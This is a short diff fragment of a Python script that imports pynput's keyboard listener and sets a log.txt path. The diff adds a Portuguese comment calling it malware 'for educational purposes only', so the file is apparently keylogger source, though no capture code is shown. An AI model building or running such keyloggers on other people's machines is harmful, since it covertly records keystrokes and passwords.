@@ -2,6 +2,9 @@ import os
 from pynput.keyboard import Listener
 
 
+# Malware desenvolvido apenas para fins educacionais
+
+
 location = os.getcwd()
 fileLocation = location + '\log.txt'
 
